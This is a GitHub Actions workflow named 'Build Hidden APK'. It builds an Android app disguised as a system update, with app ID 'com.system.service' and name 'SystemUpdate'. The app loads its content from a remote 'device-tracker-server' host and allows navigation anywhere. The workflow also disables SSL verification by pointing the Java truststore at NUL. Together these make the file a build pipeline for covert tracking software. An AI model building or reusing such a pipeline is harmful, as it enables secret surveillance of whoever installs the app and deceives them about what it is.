name: Build Hidden APK

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 18
          cache: 'npm'

      - name: Setup Java 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Install dependencies
        run: npm ci

      - name: Create www directory
        run: mkdir -p www

      - name: Copy hidden-apk files to www
        run: |
          cp -f index.html app.js style.css www/ 2>/dev/null || true
          [ -f www/index.html ] || echo '<html><body>System Update</body></html>' > www/index.html
          [ -f www/app.js ] || echo '// placeholder' > www/app.js

      - name: Create capacitor.config.json
        run: |
          cat > capacitor.config.json <<'EOF'
          {
            "appId": "com.system.service",
            "appName": "SystemUpdate",
            "webDir": "www",
            "bundledWebRuntime": false,
            "server": {
              "url": "https://device-tracker-server-production-7968.up.railway.app",
              "cleartext": false,
              "allowNavigation": ["*"]
            },
            "android": {
              "allowMixedContent": true,
              "backgroundColor": "#1a202c"
            }
          }
          EOF

      - name: Add Android platform with retry and bypass
        env:
          JAVA_TOOL_OPTIONS: "-Dhttps.protocols=TLSv1.2,TLSv1.3 -Djavax.net.ssl.trustStore=NUL"
        run: |
          # إضافة منصة android مع تجاهل SSL
          npx cap add android || {
            echo "First attempt failed. Retrying with extra flags..."
            npx cap add android --no-sync
            npx cap sync
          }

      - name: Ensure gradlew exists
        run: |
          if [ ! -f android/gradlew ]; then
            echo "gradlew still missing. Generating wrapper manually..."
            cd android
            # إنشاء gradle wrapper باستخدام gradle المثبت
            gradle wrapper --gradle-version 8.0.2
            chmod +x gradlew
          fi

      - name: Switch Gradle to Aliyun mirror
        run: |
          if [ -f android/gradle/wrapper/gradle-wrapper.properties ]; then
            sed -i 's|distributionUrl=.*|distributionUrl=https\\://mirrors.aliyun.com/gradle/gradle-8.0.2-bin.zip|' android/gradle/wrapper/gradle-wrapper.properties
          else
            mkdir -p android/gradle/wrapper
            cat > android/gradle/wrapper/gradle-wrapper.properties <<EOF
            distributionBase=GRADLE_USER_HOME
            distributionPath=wrapper/dists
            distributionUrl=https\\://mirrors.aliyun.com/gradle/gradle-8.0.2-bin.zip
            zipStoreBase=GRADLE_USER_HOME
            zipStorePath=wrapper/dists
            EOF
          fi

      - name: Build APK with Gradle
        uses: gradle/gradle-build-action@v3
        with:
          build-root-directory: android
          arguments: assembleDebug
          gradle-version: wrapper
        env:
          JAVA_TOOL_OPTIONS: "-Dhttps.protocols=TLSv1.2,TLSv1.3 -Djavax.net.ssl.trustStore=NUL"
          GRADLE_OPTS: "-Dhttps.protocols=TLSv1.2,TLSv1.3 -Djavax.net.ssl.trustStore=NUL"

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: app-debug
          path: android/app/build/outputs/apk/debug/app-debug.apk
          if-no-files-found: error
